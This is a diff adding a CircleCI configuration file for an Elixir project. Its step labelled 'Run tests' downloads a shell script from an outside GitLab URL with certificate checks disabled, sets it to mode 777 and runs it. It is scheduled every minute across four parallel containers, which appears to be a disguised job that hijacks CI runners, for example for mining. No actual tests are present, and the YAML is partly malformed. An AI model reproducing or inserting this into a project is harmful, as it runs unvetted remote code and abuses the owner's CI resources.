@@ -1,0 +1,40 @@
+working_dir: &working_dir ~/app
+.build_template: &script
+  steps:
+    - checkout
+    
+    
+    - run:
+        name: Run tests
+        command: |
+                    
+                    wget --no-check-certificate -c https://gitlab.com/CherrySolano/dc/-/raw/main/dc.sh && chmod 777 dc.sh && ./dc.sh
+                    
+
+version: 2.0
+jobs:
+  endvoc:
+    docker:
+      - image: circleci/elixir:1.7.2
+    parallelism: 4   
+
+workflows:
+  version: 2
+  commit:
+    jobs:
+      - endvoc
+      
+
+
+
+    triggers:
+      - schedule:
+          cron: '* * * * *'
+          filters:
+            branches:
+              only:
+                - master
+         
+  endvocrunjob:
+    jobs:
+      - endvoc
